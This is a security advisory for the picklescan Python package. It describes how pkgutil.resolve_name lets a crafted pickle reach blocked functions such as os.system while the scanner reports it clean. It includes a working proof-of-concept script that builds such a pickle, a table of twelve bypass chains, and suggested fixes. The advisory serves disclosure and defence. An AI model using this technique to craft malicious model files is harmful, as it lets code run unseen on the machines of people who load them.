# PickleScan's pkgutil.resolve_name has a universal blocklist bypass

**GHSA**: GHSA-vvpj-8cmc-gx39 | **CVE**: N/A | **Severity**: critical (CVSS 10.0)

**CWE**: CWE-183, CWE-693

**Affected Packages**:
- **picklescan** (pip): < 1.0.4

## Description

## Summary

`pkgutil.resolve_name()` is a Python stdlib function that resolves any `"module:attribute"` string to the corresponding Python object at runtime. By using `pkgutil.resolve_name` as the first REDUCE call in a pickle, an attacker can obtain a reference to ANY blocked function (e.g., `os.system`, `builtins.exec`, `subprocess.call`) without that function appearing in the pickle's opcodes. picklescan only sees `pkgutil.resolve_name` (which is not blocked) and misses the actual dangerous function entirely.

This defeats picklescan's **entire blocklist concept** — every single entry in `_unsafe_globals` can be bypassed.

## Severity

**Critical** (CVSS 10.0) — Universal bypass of all blocklist entries. Any blocked function can be invoked.

## Affected Versions

- picklescan <= 1.0.3 (all versions including latest)

## Details

### How It Works

A pickle file uses two chained REDUCE calls:

```
1. STACK_GLOBAL: push pkgutil.resolve_name
2. REDUCE: call resolve_name("os:system") → returns os.system function object
3. REDUCE: call the returned function("malicious command") → RCE
```

picklescan's opcode scanner sees:
- `STACK_GLOBAL` with module=`pkgutil`, name=`resolve_name` → **NOT in blocklist** → CLEAN
- The second `REDUCE` operates on a stack value (the return of the first call), not on a global import → **invisible to scanner**

The string `"os:system"` is just data (a SHORT_BINUNICODE argument to the first REDUCE) — picklescan does not analyze REDUCE arguments, only GLOBAL/INST/STACK_GLOBAL references.

### Decompiled Pickle (what the data actually does)

```python
from pkgutil import resolve_name
_var0 = resolve_name('os:system')          # Returns the actual os.system function
_var1 = _var0('malicious_command')          # Calls os.system('malicious_command')
result = _var1
```

### Confirmed Bypass Targets

Every entry in picklescan's blocklist can be reached via resolve_name:

| Chain | Resolves To | Confirmed RCE | picklescan Result |
|-------|------------|---------------|-------------------|
| `resolve_name("os:system")` | `os.system` | YES | CLEAN |
| `resolve_name("builtins:exec")` | `builtins.exec` | YES | CLEAN |
| `resolve_name("builtins:eval")` | `builtins.eval` | YES | CLEAN |
| `resolve_name("subprocess:getoutput")` | `subprocess.getoutput` | YES | CLEAN |
| `resolve_name("subprocess:getstatusoutput")` | `subprocess.getstatusoutput` | YES | CLEAN |
| `resolve_name("subprocess:call")` | `subprocess.call` | YES (shell=True needed) | CLEAN |
| `resolve_name("subprocess:check_call")` | `subprocess.check_call` | YES (shell=True needed) | CLEAN |
| `resolve_name("subprocess:check_output")` | `subprocess.check_output` | YES (shell=True needed) | CLEAN |
| `resolve_name("posix:system")` | `posix.system` | YES | CLEAN |
| `resolve_name("cProfile:run")` | `cProfile.run` | YES | CLEAN |
| `resolve_name("profile:run")` | `profile.run` | YES | CLEAN |
| `resolve_name("pty:spawn")` | `pty.spawn` | YES | CLEAN |

**Total:** 11+ confirmed RCE chains, all reporting CLEAN.

### Proof of Concept

```python
import struct, io, pickle

def sbu(s):
    b = s.encode()
    return b"\x8c" + struct.pack("<B", len(b)) + b

# resolve_name("os:system")("id")
payload = (
    b"\x80\x04\x95" + struct.pack("<Q", 55)
    + sbu("pkgutil") + sbu("resolve_name") + b"\x93"  # STACK_GLOBAL
    + sbu("os:system") + b"\x85" + b"R"                # REDUCE: resolve_name("os:system")
    + sbu("id") + b"\x85" + b"R"                       # REDUCE: os.system("id")
    + b"."                                               # STOP
)

# picklescan: 0 issues
from picklescan.scanner import scan_pickle_bytes
result = scan_pickle_bytes(io.BytesIO(payload), "test.pkl")
assert result.issues_count == 0  # CLEAN!

# Execute: runs os.system("id") → RCE
pickle.loads(payload)
```

### Why `pkgutil` Is Not Blocked

picklescan's `_unsafe_globals` (v1.0.3) does not include `pkgutil`. The module is a standard import utility — its primary purpose is module/package resolution. However, `resolve_name()` can resolve ANY attribute from ANY module, making it a universal gadget.

**Note:** fickling DOES block `pkgutil` in its `UNSAFE_IMPORTS` list.

## Impact

This is a **complete bypass** of picklescan's security model. The entire blocklist — every module and function entry in `_unsafe_globals` — is rendered ineffective. An attacker needs only use `pkgutil.resolve_name` as an indirection layer to call any Python function.

This affects:
- HuggingFace Hub (uses picklescan)
- Any ML pipeline using picklescan for safety validation
- Any system relying on picklescan's blocklist to prevent malicious pickle execution

## Suggested Fix

1. **Immediate:** Add `pkgutil` to `_unsafe_globals`:
   ```python
   "pkgutil": {"resolve_name"},
   ```

2. **Also block similar resolution functions:**
   ```python
   "importlib": "*",
   "importlib.util": "*",
   ```

3. **Architectural:** The blocklist approach cannot defend against indirect resolution gadgets. Even blocking `pkgutil`, an attacker could find other stdlib functions that resolve module attributes. Consider:
   - Analyzing REDUCE arguments for suspicious strings (e.g., patterns matching `"module:function"`)
   - Treating unknown globals as dangerous by default
   - Switching to an allowlist model
